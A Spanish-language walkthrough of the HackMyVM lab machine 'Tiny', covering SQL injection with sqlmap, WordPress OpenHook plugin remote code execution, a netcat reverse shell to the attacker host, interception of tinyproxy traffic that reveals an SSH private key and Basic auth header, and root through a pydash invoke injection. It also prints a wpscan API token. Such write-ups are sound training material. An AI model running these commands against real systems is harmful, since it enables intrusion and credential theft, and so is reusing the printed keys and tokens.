---
title: Tiny - HackMyVM Writeup
date: 2023-12-06
categories: [Writeups, HMV]
tags: [Linux, Sql Injection, Information Leakage, Wordpress Enumeration, Plugin OpenHook, PrivEsc]
---
![](/assets/img/Tiny/tiny.png)

Hola a todos! El día de hoy vamos a resolver una máquina realmente interesante creada por [cromiphi](https://www.youtube.com/@cromiphi). Esta es una máquina Linux de 
díficultad Hard.

## Enumeración
---
### Puertos

Comenzamos el escaneo de puertos con `nmap`:
```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 192.168.101.7 -oG allports
```

#### Opciones Utilizadas en el `escaneo`:
- `-p-`: Escaneo de los 65535 puertos.
- `--open`: Filtrar por aquellos puertos que tienen un estado abierto.
- `-sS`: Realizar un escaneo de tipo "TCP SYN". Si recibe un paquete SYN/ACK de vuelta, indica que el puerto está abierto. Si recibe un paquete de tipo RST (reset), significa que el puerto está cerrado.
- `--min-rate 5000`: Lanzar 5000 paquetes por segundo.
- `-n`: No realizar una resolución DNS.
- `-vvv`: Mostrar por pantalla información del escaneo.
- `-Pn`: No realizar un (host discovery) de la ip de la máquina víctima
- `192.168.101.7`: Ip de la maquina víctima
- `-oG allports` : Guardar la salida del escaneo en formato Greppable en el archivo allports.

![](/assets/img/Tiny/escaneo.png)

Utilizamos  la utilidad extractPorts del señor [savitar](https://github.com/s4vitar)  para extraer los puertos y
tenerlos copiados en la clipboard.

```bash
  extractPorts allports
```
![](/assets/img/Tiny/ports.png)

Procedemos a realizar un escaneo de versiones y lanzar algunos scripts de enumeracion.

```bash
nmap -p22,80,8888 -sCV -vvv 192.168.101.7 -oN targeted
```
#### Opciones utilizadas en el `escaneo`:
- `-p22,80,8888`: Especificamos los puertos a escanear.
- `-sCV`: Lanzamos el escaneo de versiones con el parametro "V" y de scripts con el parametro "C":
- `-vvv`: Mostrar por pantalla información del escaneo.
- `192.168.101.7`: Ip de la máquina víctima.
- `-oN targeted`: Guardar la salida del escaneo en formato Nmap en el archivo targeted.

![](/assets/img/Tiny/versiones.png)

De los resultados obtenidos vamos a enumerar el puerto 80.

## Web

Enumeramos las tecnologias de la web mediante `whatweb`.
```bash
whatweb http://192.168.101.7
```
![](/assets/img/Tiny/whatweb.png)

Vemos que nos reporta una version de WordPress 6.4.2. Podemos buscar un exploit con `searchsploit`.

![](/assets/img/Tiny/searchsploit.png)

Nos reporta varios exploit, pero no para la versión especifica del WordPress que buscamos.

Ahora nos dirigimos a la pagina web.

![](/assets/img/Tiny/pagina_web.png)
### Virtual Hosting 

Podemos ver la pagina típica de Wordpress, pero sin los estilos. Veamos el codigo fuente de la pagina con Ctrl + U.

![](/assets/img/Tiny/virtual-hosting.png)


Encontramos que la pagina esta cargando el contenido del dominio `tiny.hmv`. Entonces se esta aplicando virtual hosting.
- `virtual hosting`: El Virtual Hosting (o alojamiento virtual) es una técnica que permite que múltiples sitios web compartan un solo servidor físico, pero aparezcan como si estuvieran alojados en servidores independientes


Agregamos el dominio a nuestro /etc/hosts para que resuelva correctamente.

![](/assets/img/Tiny/etc-hosts.png)

![](/assets/img/Tiny/wordpress.png)
## Fuzzing

Fuzzeamos directorios usando nmap con el script `http-enum` al puerto 80.

```bash
nmap --script http-enum -p80 192.168.101.7 -oN webscan -vvv
```
![](/assets/img/Tiny/http-enum.png)

En el robots.txt encontramos un subdominio wish.tiny.hmv. Lo añadimos al /etc/hosts

![](/assets/img/Tiny/robots.txt.png) 

![](/assets/img/Tiny/etc-hosts2.png)

Al entrar al nuevo subdominio, vemos la siguiente página.

![](/assets/img/Tiny/wish-tiny.png)
## SQLI

Verificamos si el panel de deseos es vulnerable a sqli usando `Sqlmap`.

```bash
sqlmap -r requests.req --batch
```
![](/assets/img/Tiny/sqlmap.png)
### Bases de datos
Al ser vulnerable vamos a  dumpear las bases de datos existentes.

```bash
sqlmap -r requests.req --batch --dbs
```
```bash
available databases [2]:
[*] information_schema
[*] wish_db
```
### Tablas
Veamos las tablas de la base de datos `wish_db`. 
```bash
sqlmap -r requests.req --batch -D wish_db --tables
```

```bash
Database: wish_db
[3 tables]
+--------------+
| admin        |
| utilisateurs |
| wishs        |
+--------------+
```
### Columnas
Ahora vamos por las columnas de la tabla `admin`.
```bash
sqlmap -r requests.req --batch -D wish_db -T admin --columns
```

```bash
Database: wish_db
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  !
+----------+--------------+
```
### Registros
Dumpeamos todos los registros.
```bash
sqlmap -r requests.req --batch -D wish_db -T admin -C id,password,username --dump
```

```bash
Database: wish_db                                                                                                                   
Table: admin
[1 entry]
+----+--------------------------------------------+----------+
| id | password                                   | username |
+----+--------------------------------------------+----------+
| 1  | 8df4387dd1598d4dcf237f9443028cec (fuckit!) | umeko    |
+----+--------------------------------------------+----------+
```
Vemos al usuario `umeko` y su contraseña `fuckit!`. Si recordamos anteriormente encontramos un wordpress, podemos probar las 
credenciales en el panel de administrador para ver si logramos obtener acceso.

![](/assets/img/Tiny/acceso-wordpress.png)

Para suerte nuestra las credenciales eran correctas.

![](/assets/img/Tiny/panel-wordpress.png)
## Shell - www-data
Estando dentro del WordPress nos hace falta enumerarlo, la enumeración la podemos realizar [con wp-scan](https://github.com/wpscanteam/wpscan).

```bash
wpscan --url http://tiny.hmv --enumerate vp,u --plugins-detection aggressive --api-token=i47sygIFHTNJB1xxW5q5rlZ1nubW3RaqodgnT3ohwa8
```
#### Opciones utilizadas:
- `--url http://tiny.hmv`: Especificar el objetivo.
- `--enumerate vp,u`: Enumerar plugins(vp) y usuarios(u).
- `--plugins-detection aggressive`: Para que la enumeración de plugins sea agresiva.
- `--api-token=i47sygIFHTNJB1xxW5q5rlZ1nubW3RaqodgnT3ohwa8` : Usar la api token de wpscan para poder enumerar la mayor cantidad de plugins vulnerables.
Para obtener el api token directamente en la pagina de [wp-scan](https://wpscan.com/), logueandose se  proporciona.

```
Title: OpenHook < 4.3.1  Subscriber+ Remote Code Execution
    Fixed in: 4.3.1
    References:
     - https://wpscan.com/vulnerability/5bd9fbd2-26ea-404a-aba7-f0c457a082b6
     - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5201
     - https://www.wordfence.com/threat-intel/vulnerabilities/id/37b9ed0e-5af2-47c1-b2da-8d103e4c31bf

```

Encontramos un plugin vulnerable el cual permite la ejecución remota de comandos.

[OpenHook](https://github.com/advisories/GHSA-52wg-h24c-3wgr). En este link nos dicen que la vulnerabilidad se da porque mediante shorcuts 
especificamente el shortcode [php], el atacante puede ejecutar comandos como un usuario privilegiado. Esto mediante la inyeccion del shortcode dentro de una 
publicacion del WordPress.

Lo primero que tenemos que hacer es crear una nueva publicación en el WordPress. Posts -> Add New Post

![](/assets/img/Tiny/post.png) 

En el simbolo del mas , debemos buscar `Shortcode` y seleccionarlo.

![](/assets/img/Tiny/shortcode.png)

Dentro del ShortCode ponemos lo siguiente para verificar si hay ejecución remota de comandos.
![](/assets/img/Tiny/publish.png)

Antes de publicar modificamos para que el autor sea admin.

![](/assets/img/Tiny/autor-admin.png)

Una vez publicado nos vamos al post y verificamos que tenemos ejecución remota de comandos.

![](/assets/img/Tiny/rce.png)

Nos establamos una reverse shell mediante un oneliner de netcat [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
nc -e /bin/sh 192.168.101.10 443
```
Nos ponemos a la escucha con netcat por un puerto y obtenemos la shell.

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.101.10] from (UNKNOWN) [192.168.101.12] 37098
```
Ahora tenemos que hacer el tratamiento de la TTY para poder tener una 100% interactiva.

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.101.10] from (UNKNOWN) [192.168.101.12] 37098
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@tiny:/var/www/html$ ^Z
[1]  + 63852 suspended  nc -nlvp 443

stty raw -echo; fg
[1]  + 63852 continued  nc -nlvp 443
                                    reset xterm [ENTER]


www-data@tiny:/var/www/html$ export TERM=xterm
www-data@tiny:/var/www/html$ export SHELL=bash
www-data@tiny:/var/www/html$ stty rows 36 columns 133
www-data@tiny:/var/www/html$         
```
Estando dentro de la maquina vamos a verificar con la herramienta [pspy64](https://github.com/DominicBreuker/pspy) para poder identificar tareas cron que se esten ejecutando
en el sistema.

Transferimos el compilado de pspy a la maquina mediante un servidor de python3.
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.101.12 - - [19/Dec/2023 20:07:19] "GET /pspy64 HTTP/1.1" 200 -


www-data@tiny:/tmp$ wget http://192.168.101.10/pspy64
--2023-12-20 02:07:23--  http://192.168.101.10/pspy64
Connecting to 192.168.101.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                            100%[==========================================================>]   2.96M  --.-KB/s    in 0.02s   

2023-12-20 02:07:23 (152 MB/s) - 'pspy64' saved [3104768/3104768]

www-data@tiny:/tmp$ 
```
## Shell - vic
La damos permisos de ejecución y lo ejecutamos.

```bash
www-data@tiny:/tmp$ chmod +x pspy64
```
Al cabo de un momento vemos la siguiente tarea, donde el usuario con UID 104 esta ejecutando tinyproxy.
```bash
CMD: UID=104   PID=503    | /usr/bin/tinyproxy -d
```

Veamos los archivos de configuracion del tinyproxy y encontramos que el puerto 1111 esta abierto en el localhost.
localhost:1111" especifica el destino al que se dirige el tráfico. "localhost" es una referencia al propio dispositivo en el que se está ejecutando el comando y "1111" es un número de puerto específico al que se está apuntando. 
```bash
www-data@tiny:/tmp$ cat /etc/tinyproxy/tinyproxy.conf  | grep -v "#"
User tinyproxy
Group tinyproxy
Port 8888
Timeout 600
DefaultErrorFile "/usr/share/tinyproxy/default.html"
StatFile "/usr/share/tinyproxy/stats.html"
LogFile "/var/log/tinyproxy/tinyproxy.log"
LogLevel Info
PidFile "/run/tinyproxy/tinyproxy.pid"
Upstream http localhost:1111
```

Si el trafico se esta redirigiendo al puerto 1111, pongamos en escucha con nc para ver que nos llega.
De la respuesta que obtenemos vemos que hay un 'GET http://127.0.0.1:8000/id_rsa'

```bash
www-data@tiny:/tmp$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34952
GET http://127.0.0.1:8000/id_rsa HTTP/1.1
Host: 127.0.0.1:8000
Connection: close
Via: 1.1 tinyproxy (tinyproxy/1.11.1)
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz
User-Agent: curl/7.88.1
Accept: */*
```

Lo que vamos hacer es crear una redireccion del puerto 1111 al 8000 mediante socat

```bash
www-data@tiny:/tmp$ socat -v tcp-listen:1111,reuseaddr tcp:localhost:8000
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

Obtenemos la cable privada del usuario `vic` para conectarnos mediante ssh. 
```bash
nano id_rsa
chmod 600 id_rsa
```
```bash
ssh -i id_rsa vic@192.168.101.12
Linux tiny.hmv 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
╭─vic@tiny ~                                                                                                                        
╰─$ 
```
## Shell - Root
Verificando los privilegios SUID del usuario vic, vemos lo siguiente.

```bash
sudo -l
Matching Defaults entries for vic on tiny:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vic may run the following commands on tiny:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/car.py*
```
Verificamos que es lo que  contiene  el archivo car.py. Vemos la libreria pydash la cual si buscamos tiene una vulnerabilidad 
que permite inyectar comandos[pydash](https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518).

```bash
import sys
import random
import pydash


class Car:
    def __init__(self, model, year):
        self.model = model
        self.year = year
        self.id = random.randint(1, 99999)

    def get_info(self, info_type):
        if info_type == "model":
            return self.model
        elif info_type == "year":
            return self.year
        elif info_type == "id":
            return self.id


def poc(path, arg):
    obj = Car('Sedan', 2011)
    res = pydash.objects.invoke(obj, path, arg)
    print(res)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])
```

La vulnerabilidad dice lo siguiente. El método pydash.objects.invoke() es vulnerable a la inyección de comandos cuando se cumplen los siguientes requisitos previos:

El objeto fuente (argumento 1) no es un objeto integrado como list/dict (de lo contrario, no se puede acceder a la ruta __init__.__globals__)

El atacante tiene control sobre el argumento 2 (la cadena de ruta) y el argumento 3 (el argumento que se pasará al método invocado).

Corremos el archivo car.py de la siguiente manera para poder obtener una shell como el usuario root.

```bash
sudo /usr/bin/python3 /opt/car.py* __init__.__globals__.random._os.system "bash -p"
root@tiny:/opt#
```

Y listo ya estaria la maquina!. Gracias por leer.
